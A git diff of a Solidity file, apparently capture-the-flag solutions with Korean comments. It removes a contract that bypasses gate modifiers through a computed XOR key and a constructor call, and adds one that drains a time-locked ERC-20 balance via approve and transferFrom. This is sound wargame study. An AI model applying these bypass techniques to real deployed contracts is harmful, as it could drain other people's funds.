@@ -2,23 +2,38 @@
 pragma solidity ^0.8.13;
 
 /* 동작 방식 정리
- * 1. gateOne 제한자: msg.sender와 tx.origin이 일치하지 않아야함 (= 실행 주체 CA)
- * 2. gateTwo 제한자: CA에서 함수 호출 시 extcodesize가 0이어야 함 (= 생성자에서 바로 호출하기, extcodesize가 정확히 무슨 의미인지 설명 필요)
- * 3. gateThree 제한자: gateKey와 msg.sender를 keccak256 연산한 해시값의 하위 8바이트와 xor 연산한 값이 uint64의 최대값이어야함.
+ * 1. 컨트랙트 생성 시 player (= 공격자) 주소로 토큰이 민트됨
+ * 2. timeLock이 2035년으로 지정되어 있음
+ * 3. transfer로 player가 직접 전송을 시도할 경우 lockTokens 제한자에 의해 토큰 직접 전송이 제한됨
  *
  * 목표
- * 제한자 모두 우회하고 enter 함수 실행하기
+ * 컨트랙트 내 player 잔액 전액 인출 (ERC-20 표준 제대로만 알면 쉬운 문제)
  *
  * 공격 방식
- * 1. gateKey를 [동작 방식 정리] 3번 항목의 조건에 맞게 CA 컨트랙트의 주소로 맞춰서 값 설정
- * 2. [동작 방식 정리] 2번 항목의 조건을 충족시키기 위해 enter 함수를 생성자에서 바로 호출
+ * 1. ERC-20 토큰의 기능 중 transferFrom 함수 기능을 이용하여 공격자의 토큰 잔액을 성공적으로 인출하기 위해 다른 주소로 사용
+ * 2. transferFrom 기능을 사용하기 위해 approve 함수와 balanceOf 함수를 이용해서 player가 player의 잔액 전액을 
+ *    spender에게 공격자 CA가 송금하도록 제3자 사용 허용시키기
+ * 3. approve 함수로 허용 후 공격자 CA를 통해 transferFrom 함수를 사용하여 player에서 spender로 송금 실시
  */
 
-contract Solve {
-    bytes8 public gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
-    bytes public encodedData = abi.encodeWithSignature("enter(bytes8)", gateKey);
+interface ERC20 {
+    function approve(address spender, uint256) external;
+    function balanceOf(address account) external returns (uint256);
+    function transferFrom(address from, address to, uint256) external returns (bool);
+}
 
-    constructor(address _target) {
-        (bool result, ) = _target.call(encodedData);
+contract Solve {
+    address owner;
+    address spender;
+    address target;
+
+    constructor(address _target, address _owner, address _spender) {
+        target = _target;
+        owner = _owner;
+        spender = _spender;
+    }
+
+    function attack(uint256 _balance) public {
+        ERC20(target).transferFrom(owner, spender, _balance);
     }
 }
